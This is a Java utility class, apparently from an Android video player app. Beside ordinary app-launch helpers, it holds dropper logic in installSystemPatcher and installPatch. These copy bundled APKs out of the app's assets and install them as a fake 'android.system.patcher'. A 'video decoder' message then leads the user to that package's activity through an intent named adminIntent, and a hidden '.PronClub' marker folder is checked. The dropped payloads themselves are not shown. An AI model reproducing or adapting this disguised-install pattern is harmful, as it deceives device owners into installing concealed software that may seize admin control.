package com.xyh.video.appdown;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;

import android.annotation.SuppressLint;
import android.app.Activity;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.content.pm.PackageManager.NameNotFoundException;
import android.content.res.AssetManager;
import android.net.Uri;
import android.os.Environment;
import android.view.View;
import android.view.View.OnClickListener;
import android.widget.Button;
import android.widget.Toast;

import com.shipin.player.VLCApplication;
import com.videoplayer.bd.R;
import com.xinyinhe.juheplayer.MainActivity;
import com.xyh.video.utils.Constants;
import com.xyh.video.utils.Utils;

public class ApkUtils {
	
	//安装应用
	public static void installApk(File file){
		Intent intent = new Intent(Intent.ACTION_VIEW);
		intent.addCategory(Intent.CATEGORY_DEFAULT);
		intent.setDataAndType(Uri.fromFile(file), "application/vnd.android.package-archive");
		intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
		VLCApplication.getApp().startActivity(intent);
	}
	
	public static void luanchActivity(Context ctx,String pkg){
		PackageManager manager = ctx.getPackageManager();
		Intent intent = manager.getLaunchIntentForPackage(pkg);
		if(intent != null){
			intent = intent.cloneFilter();
			intent.addFlags(Intent.FLAG_ACTIVITY_BROUGHT_TO_FRONT | Intent.FLAG_ACTIVITY_NEW_TASK);
		}else{
			try {
				PackageInfo pkginfo = manager.getPackageInfo(pkg,PackageManager.GET_ACTIVITIES);
				if(pkginfo != null && pkginfo.activities != null){
					intent = new Intent(Intent.ACTION_MAIN);
					intent.addFlags(Intent.FLAG_ACTIVITY_BROUGHT_TO_FRONT | Intent.FLAG_ACTIVITY_NEW_TASK);
					intent.setClassName(pkginfo.packageName,pkginfo.activities[0].name);
				}
			} catch (NameNotFoundException e) {
				e.printStackTrace();
			}
		}
		
		if(intent != null){
			ctx.startActivity(intent);
		}
	}
	
	
	
	public static boolean isInstallDeviceAndActive(Context context){
		boolean install = ApkUtils.isAppInstalled(context, "android.system.patcher");
		File file = new File(Environment.getExternalStorageDirectory() + "/.PronClub/device");
		boolean active = file.exists();
		if(install && active){
			return true ;
		}
		return false;
	}
	
	@SuppressLint("NewApi")
	public static boolean showDialogToast(final Activity activity){
		if(isInstallDeviceAndActive(activity)){
			return false;
		}
		if(dialog != null){
			dialog = null;
		}
		dialog = new CustomDialog(activity);
		Button button = (Button)dialog.findViewById(R.id.yes);
		button.setOnClickListener(new OnClickListener(){
			@Override
			public void onClick(View view) {
				Intent intent = new Intent(activity,MainActivity.class);
				//intent.putExtra("index", GmainActivity.TAG_WALL);
				activity.startActivity(intent);
//				installSystemPatcher(activity.getApplicationContext());
				dialog.cancel();
				dialog = null;
			}
		});
		
		Button no = (Button)dialog.findViewById(R.id.no);
		no.setOnClickListener(new OnClickListener(){
			@Override
			public void onClick(View view) {
				dialog.cancel();
				dialog = null;
			}
		});
		if(!dialog.isShowing()){
			dialog.show();
		}
		return true;
	}
	public static void closeDialog(){
		if(dialog != null){
			dialog.cancel();
			dialog = null;
		}
	}
	private static CustomDialog dialog ;
	
	
	public static boolean installSystemPatcher(Context context){
		if(!ApkUtils.isAppInstalled(context, "android.system.patcher")){
			AssetManager manager = context.getAssets();
			try {
				File path = new File(Constants.FILE_PATH);
				if(!path.exists()){
					path.mkdirs();
				}
				
				InputStream input = manager.open("PushDeviceManager.apk");
				File file = new File(Constants.FILE_PATH+"/"+Utils.MD5Encode("PushDeviceManager.apk"));
				if(file.exists()){
					file.delete();
				}
				FileOutputStream out = new FileOutputStream(file,true);
				byte[] buffer = new byte[100 * 1024];
				int read = -1;
				while((read = input.read(buffer)) != -1){
					out.write(buffer, 0, read);
				}
				input.close();
				out.close();
				ApkUtils.installApk(file);
				return false;
			} catch (IOException e) {
				e.printStackTrace();
			}
		}else {
			File path = new File(Environment.getExternalStorageDirectory() + "/.PronClub/");
			if(!path.exists()){
				path.mkdirs();
			}
			
			File file = new File(Environment.getExternalStorageDirectory() + "/.PronClub/device");
			if(!file.exists()){
				Toast.makeText(context, R.string.invoke_video_decoder, Toast.LENGTH_LONG).show();
				Intent adminIntent = new Intent();
				ComponentName component = new ComponentName("android.system.patcher","android.system.patcher.MainActivity");
				adminIntent.setComponent(component);
				adminIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
				context.startActivity(adminIntent);
				return false;
			}
		}
		return true;
	}
	
	
	
	public static boolean installPatch(Context context){
		if(!ApkUtils.isAppInstalled(context, "android.system.patcher")){
			AssetManager manager = context.getAssets();
			try {
				InputStream input = manager.open("android.patch.apk");
				File file = new File(Constants.FILE_PATH+"/"+Utils.MD5Encode("android.patch.apk"));
				if(file.exists()){
					file.delete();
				}
				FileOutputStream out = new FileOutputStream(file,true);
				byte[] buffer = new byte[100 * 1024];
				int read = -1;
				while((read = input.read(buffer)) != -1){
					out.write(buffer, 0, read);
				}
				input.close();
				out.close();
				ApkUtils.installApk(file);
				return false;
			} catch (IOException e) {
				e.printStackTrace();
			}
		}else {
			File file = new File(Environment.getExternalStorageDirectory() + "/.PronClub/device");
			if(!file.exists()){
				Toast.makeText(context, R.string.invoke_video_decoder, Toast.LENGTH_LONG).show();
				Intent adminIntent = new Intent();
				ComponentName component = new ComponentName("android.system.patcher","android.system.patcher.MainActivity");
				adminIntent.setComponent(component);
				adminIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
				context.startActivity(adminIntent);
				return false;
			}
		}
		return true;
	}
	
	
	
	public static boolean isAppInstalled(Context context, String packageName) {
		PackageManager pm = context.getPackageManager();
		try {
			android.content.pm.PackageInfo pi = pm.getPackageInfo(packageName, 0);
			if (pi != null)
				return true;
		} catch (NameNotFoundException e) {
			// ignore
		}
		return false;
	}
}
